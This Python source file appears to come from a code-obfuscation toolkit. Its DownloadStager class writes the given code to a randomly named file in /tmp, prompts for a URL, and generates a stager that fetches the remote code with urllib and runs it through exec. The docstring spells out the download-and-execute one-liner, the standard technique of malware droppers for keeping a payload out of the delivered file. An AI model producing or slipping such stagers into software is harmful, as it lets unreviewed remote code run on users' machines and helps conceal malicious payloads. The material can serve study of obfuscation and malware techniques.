import random
from tokenize import NAME, NEWLINE, OP, STRING

from pof.utils.tokens import untokenize


class DownloadStager:
    """Download.

    Code compatible with Python3 only (change in urllib names):

    Todo:
    - make it compatible with Python2
    """

    def __init__(self, url=None, one_liner=False) -> None:
        # the URL can eitehr be given has a parameter or given interactively when
        # executing the stager in an input
        self.url = url
        self.one_liner = one_liner

    def upload(self, code):
        name = (
            "".join([random.choice("abcdefghjiklmnopqrstuvwxyz") for _ in range(6)])
            + ".py"
        )
        path = "/tmp/" + name
        with open(path, "w") as f:
            f.write(code.decode())
        print(f"tmp file at: {path}")
        print("upload the code to any platform (or even locally)")
        raw_link = self.url
        if not raw_link:
            raw_link = input("url = ")
        return raw_link

    def generate_stager(self, tokens):
        """Generate the download stager.

        ```
        from urllib import request
        exec(request.urlopen("http://link...").read())
        ```

        if one_liner is true:

        ```python
        from urllib import request;exec(request.urlopen("http://link...").read())
        ```
        """
        code = untokenize(tokens)
        url = self.upload(code.encode())

        separation_tokens = [[NEWLINE, "\n"]]
        if self.one_liner:
            separation_tokens = [[OP, ";"]]

        return [
            [NAME, "from"],
            [NAME, "urllib"],
            [NAME, "import"],
            [NAME, "request"],
            *separation_tokens,
            [NAME, "exec"],
            [OP, "("],
            [NAME, "request"],
            [OP, "."],
            [NAME, "urlopen"],
            [OP, "("],
            [STRING, repr(url)],
            [OP, ")"],
            [OP, "."],
            [NAME, "read"],
            [OP, "("],
            [OP, ")"],
            [OP, ")"],
            [NEWLINE, "\n"],
        ]
